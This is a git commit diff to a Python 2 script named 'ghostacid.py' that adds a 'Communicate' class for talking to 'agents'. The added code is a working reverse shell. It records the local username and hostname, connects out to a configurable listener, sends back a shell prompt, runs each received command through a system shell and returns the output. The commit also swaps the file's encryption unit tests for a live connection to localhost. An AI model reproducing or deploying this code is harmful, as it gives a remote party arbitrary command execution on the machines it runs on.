deac6b00f3808f3892f92391b1d9e16621c3241b
Kyle Wukawitz <wukawitz@gmail.com>
2017-12-10 21:56:01 -0500

    Addition of communication piece

--- ghostacid.py
+++ ghostacid.py
@@ -6,6 +6,11 @@ from Crypto.Cipher import AES
 import subprocess
 import base64
 import hashlib
+import socket
+import uuid
+import pwd
+import os
+import subprocess
 
 ################################################################################
 ################################################################################
@@ -142,66 +147,169 @@ class Encrypt(object):
 ################################################################################
 ################################################################################
 
+class Communicate(object):
+    """
+    Class for communicating with agents
+    """
+
+    def __init__(self, **kwargs):
+        """
+        Communicate constructor
+        Arguments:
+            host - The host to communicate with
+            port - The port number to communicate on
+        """
+        self.host = kwargs.get("host", "")
+        self.port = int(kwargs.get("port", 0))
+        self.sock = socket.socket()
+        self.hostname = ""
+        self.username = ""
+        self.dirname = ""
+        try:
+            self.hostname = socket.gethostname()
+            self.username = pwd.getpwuid(os.getuid()).pw_name
+        except Exception, e_obj:
+            print "[!] ERROR - Communicate.__init__() - {0}" \
+                  .format(str(e_obj))
+
+    def _get_prompt(self):
+        """
+        Create prompt to send back to the server
+        """
+        prompt = ""
+        try:
+            dirpath = os.path.dirname(os.path.realpath(__file__))
+            if self.hostname and self.username:
+                dirpath = os.path.dirname(os.path.realpath(__file__))
+                prompt= "{0}@{1} {2} $ ".format(self.username, self.hostname, \
+                                                               dirpath)
+            else:
+                prompt = "cmd {0} $ ".format(dirpath)
+        except Exception, e_obj:
+            print "[!] ERROR - Communicate._get_prompt() - {0}" \
+                  .format(str(e_obj))
+        return prompt
+
+    def _run_command(self, **kwargs):
+        """
+        Run a command on the host
+        Arguments:
+            command - The command to execute on the system
+        """
+        result = ""
+        try:
+            command = kwargs.get("command", "")
+            if command.startswith("cd"):
+                cd_cmd = str(command.strip()).split(" ")
+                cdir = cd_cmd[1:][0]
+                if len(cd_cmd) > 1:
+                    os.chdir(str(cdir))
+            else:
+                proc = subprocess.Popen(command,
+                                        shell=True,
+                                        stdin=subprocess.PIPE,
+                                        stdout=subprocess.PIPE,
+                                        stderr=subprocess.PIPE,
+                                        )
+                stdout_value, stderr_value = proc.communicate()
+                if stdout_value:
+                    result = stdout_value
+                else:
+                    result = stderr_value
+        except Exception, e_obj:
+            print "[!] ERROR - Communicate._run_command() - {0}" \
+                  .format(str(e_obj))
+        return result
+
+    def connect_and_communicate(self, **kwargs):
+        """
+        Connect to a listener and communicate
+        Arguments:
+            callback - the callback used to process data received
+        """
+        try:
+            callback = kwargs.get("callback", None)
+            self.sock.connect((self.host, self.port))
+            while True:
+                data = ""
+                part = None
+                self.sock.send(self._get_prompt())
+                data = self.sock.recv(4096)
+                result = self._run_command(command=data)
+                self.sock.send(result)
+        except Exception, e_obj:
+            print "[!] ERROR - Communicate.connect_and_communicate() - {0}" \
+                  .format(str(e_obj))
+
+################################################################################
+################################################################################
+################################################################################
+
 def test():
     """
     Basic unit testing
     """
     try:
+        host = "127.0.0.1"
+        port = 8080
+        c_obj = Communicate(host=host, port=port)
+        c_obj.connect_and_communicate(callback=None)
+        # c_obj._run_command(command="cd ..")
 
-        ### Test #1
-        test_str = "alpha"
-        padded_str = Encrypt.pad(current_str=test_str)
-        result_str = "alpha}}}}}}}}}}}}}}}}}}}}}}}}}}}"
-        assert padded_str == result_str, "Failed test #1"
-
-        ### Test #2
-        test_str = "alpha"
-        padded_str = Encrypt.pad(current_str=test_str, current_length=16)
-        result_str = "alpha}}}}}}}}}}}"
-        assert padded_str == result_str, "Failed test #2"
-
-        ### Test #3
-        test_str = "alpha"
-        padded_str = Encrypt.pad(current_str=test_str, pad_with="#")
-        result_str = "alpha###########################"
-        assert padded_str == result_str, "Failed test #3"
-
-        ### Test #4
-        test_str = "alpha"
-        test_key = "bravo"
-        encrypted_str = Encrypt.encrypt(plaintext=test_str, shared_key=test_key)
-        assert len(encrypted_str) == 28, "Failed test #4"
-
-        ### Test #5
-        test_str = "alpha"
-        test_key = "bravo"
-        encrypted_str = Encrypt.encrypt(plaintext=test_str, shared_key=test_key)
-        decrypted_str = Encrypt.decrypt(ciphertext=encrypted_str, \
-                                        shared_key=test_key)
-        assert test_str == decrypted_str, "Failed test #5"
-
-        ### Test #6
-        test_str = "alpha"
-        test_key_list = ["bravo", "charlie", "delta"]
-        encrypted_str = Encrypt.encrypt_multiple(plaintext=test_str, \
-                                                 shared_keys=test_key_list)
-        assert len(encrypted_str) == 104, "Failed test #6"
-
-        ### Test #7
-        test_str = "alpha"
-        test_key_list = ["bravo", "charlie", "delta"]
-        encrypted_str = Encrypt.encrypt_multiple(plaintext=test_str, \
-                                                 shared_keys=test_key_list)
-        decrypted_str = Encrypt.decrypt_multiple(ciphertext=encrypted_str, \
-                                                 shared_keys=test_key_list)
-        assert test_str == decrypted_str, "Failed test #7"
-
-        ### Test #8
-        test_str = "alpha"
-        encrypted_str = Encrypt.sha256(plaintext=test_str)
-        assert len(encrypted_str) == 64, "Failed test #8"
-
-        print "[*] Unit testing complete"
+        # ### Test #1
+        # test_str = "alpha"
+        # padded_str = Encrypt.pad(current_str=test_str)
+        # result_str = "alpha}}}}}}}}}}}}}}}}}}}}}}}}}}}"
+        # assert padded_str == result_str, "Failed test #1"
+        #
+        # ### Test #2
+        # test_str = "alpha"
+        # padded_str = Encrypt.pad(current_str=test_str, current_length=16)
+        # result_str = "alpha}}}}}}}}}}}"
+        # assert padded_str == result_str, "Failed test #2"
+        #
+        # ### Test #3
+        # test_str = "alpha"
+        # padded_str = Encrypt.pad(current_str=test_str, pad_with="#")
+        # result_str = "alpha###########################"
+        # assert padded_str == result_str, "Failed test #3"
+        #
+        # ### Test #4
+        # test_str = "alpha"
+        # test_key = "bravo"
+        # encrypted_str = Encrypt.encrypt(plaintext=test_str, shared_key=test_key)
+        # assert len(encrypted_str) == 28, "Failed test #4"
+        #
+        # ### Test #5
+        # test_str = "alpha"
+        # test_key = "bravo"
+        # encrypted_str = Encrypt.encrypt(plaintext=test_str, shared_key=test_key)
+        # decrypted_str = Encrypt.decrypt(ciphertext=encrypted_str, \
+        #                                 shared_key=test_key)
+        # assert test_str == decrypted_str, "Failed test #5"
+        #
+        # ### Test #6
+        # test_str = "alpha"
+        # test_key_list = ["bravo", "charlie", "delta"]
+        # encrypted_str = Encrypt.encrypt_multiple(plaintext=test_str, \
+        #                                          shared_keys=test_key_list)
+        # assert len(encrypted_str) == 104, "Failed test #6"
+        #
+        # ### Test #7
+        # test_str = "alpha"
+        # test_key_list = ["bravo", "charlie", "delta"]
+        # encrypted_str = Encrypt.encrypt_multiple(plaintext=test_str, \
+        #                                          shared_keys=test_key_list)
+        # decrypted_str = Encrypt.decrypt_multiple(ciphertext=encrypted_str, \
+        #                                          shared_keys=test_key_list)
+        # assert test_str == decrypted_str, "Failed test #7"
+        #
+        # ### Test #8
+        # test_str = "alpha"
+        # encrypted_str = Encrypt.sha256(plaintext=test_str)
+        # assert len(encrypted_str) == 64, "Failed test #8"
+        #
+        # print "[*] Unit testing complete"
     except Exception, e_obj:
         print "[!] UNIT TEST ERROR - {0}".format(str(e_obj))
 
